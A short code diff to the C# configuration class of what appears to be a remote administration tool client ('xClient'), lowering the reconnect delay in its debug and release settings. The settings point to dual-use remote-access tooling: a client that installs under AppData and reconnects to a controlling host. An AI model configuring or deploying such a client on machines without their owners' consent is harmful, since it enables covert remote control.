@@ -12,7 +12,7 @@ namespace xClient.Config
         public static string VERSION = "1.0.0.0d";
         public static string HOST = "localhost";
         public static ushort PORT = 4782;
-        public static int RECONNECTDELAY = 5000;
+        public static int RECONNECTDELAY = 1;
         public static string PASSWORD = "1234";
         public static string DIR = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         public static string SUBFOLDER = "Test";
@@ -32,7 +32,7 @@ namespace xClient.Config
         public static string VERSION = "1.0.0.0r";
         public static string HOST = "localhost";
         public static ushort PORT = 4782;
-        public static int RECONNECTDELAY = 5000;
+        public static int RECONNECTDELAY = 300;
         public static string PASSWORD = "1234";
         public static string DIR = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         public static string SUBFOLDER = "SUB";
